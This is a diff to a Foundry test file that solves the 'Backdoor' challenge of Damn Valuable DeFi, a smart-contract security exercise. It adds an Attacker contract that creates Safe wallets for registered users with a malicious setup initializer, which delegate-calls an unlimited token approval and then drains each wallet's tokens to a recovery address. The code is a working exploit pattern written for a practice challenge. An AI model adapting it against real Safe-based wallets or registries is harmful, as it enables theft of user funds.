@@ -4,9 +4,78 @@ pragma solidity =0.8.25;
 
 import { Test, console } from "forge-std/Test.sol";
 import { Safe } from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import { Enum } from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
 import { SafeProxyFactory } from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
 import { WalletRegistry } from "../../src/backdoor/WalletRegistry.sol";
+
+contract Attacker {
+    address player;
+    // Must be immutable to enable delegate call
+    DamnValuableToken immutable token;
+    Safe singletonCopy;
+    SafeProxyFactory walletFactory;
+    WalletRegistry walletRegistry;
+
+    constructor(
+        address _player,
+        DamnValuableToken _token,
+        Safe _singletonCopy,
+        SafeProxyFactory _walletFactory,
+        WalletRegistry _walletRegistry
+    ) {
+        player = _player;
+        token = _token;
+        singletonCopy = _singletonCopy;
+        walletFactory = _walletFactory;
+        walletRegistry = _walletRegistry;
+    }
+
+    function approve(address spender) external {
+        token.approve(spender, type(uint256).max);
+    }
+
+    function recovery(address[] memory users, address target) external {
+        for (uint256 i = 0; i < users.length; ++i) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            bytes memory attackCall = abi.encodeCall(
+                this.approve,
+                (address(this))
+            );
+            bytes memory initializer = abi.encodeCall(
+                singletonCopy.setup,
+                (
+                    owners,
+                    1,
+                    address(this),
+                    attackCall,
+                    address(0),
+                    address(0),
+                    0,
+                    payable(address(0))
+                )
+            );
+            Safe wallet = Safe(
+                payable(
+                    address(
+                        walletFactory.createProxyWithCallback(
+                            address(singletonCopy),
+                            initializer,
+                            0,
+                            walletRegistry
+                        )
+                    )
+                )
+            );
+            token.transferFrom(
+                address(wallet),
+                target,
+                token.balanceOf(address(wallet))
+            );
+        }
+    }
+}
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -83,12 +152,14 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        walletFactory.createProxyWithCallback(
+        Attacker attacker = new Attacker(
+            player,
+            token,
             singletonCopy,
-            "",
-            0,
+            walletFactory,
             walletRegistry
         );
+        attacker.recovery(users, recovery);
     }
 
     /**
